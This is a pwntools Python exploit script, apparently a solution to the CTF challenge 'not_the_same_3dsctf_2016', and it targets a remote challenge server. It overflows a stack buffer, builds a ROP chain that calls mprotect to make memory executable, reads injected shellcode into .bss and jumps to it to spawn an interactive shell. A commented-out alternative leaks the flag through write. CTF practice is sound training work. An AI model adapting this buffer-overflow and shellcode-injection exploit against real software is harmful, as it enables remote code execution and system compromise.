from pwn import *

context.os = 'linux'
context.arch = 'i386'
# context.log_level = 'debug'

getSecretAddr = 0x80489a0
fl4gAddr      = 0x80eca2d
printfAddr    = 0x804f0a0
writeAddr     = 0x806e270
mprotectAddr  = 0x806ed40
fakeRetAddr   = 0xdeadbeef

bssDataAddr   = 0x80ec000
pop3gadget    = 0x80527ba
readAddr      = 0x806e200

if args.LOCAL:
    p = process("./not_the_same_3dsctf_2016")
else:
    p = remote("node3.buuoj.cn", 28159)

# ========================method 1:先调用get_secret()，再调用write()函数打印flag值===============================
# payload = b'a'*(0x2d)+p32(getSecretAddr)+p32(writeAddr)+p32(fakeRetAddr)+p32(1)+p32(fl4gAddr)+p32(45)

# p.sendline(payload)

# ========================method 2: 先调用mprotect()修改地址控制权限，然后调用read()写入shellcode，再跳转执行shellcode===============================
shellcode = asm(shellcraft.sh())
payload = b'a'*0x2d + p32(mprotectAddr) + p32(pop3gadget) + p32(bssDataAddr) + p32(len(shellcode)) + p32(7)
payload += p32(readAddr) + p32(pop3gadget) + p32(0) + p32(bssDataAddr) + p32(len(shellcode))
payload += p32(bssDataAddr)

p.sendline(payload)
p.sendline(shellcode)

p.interactive()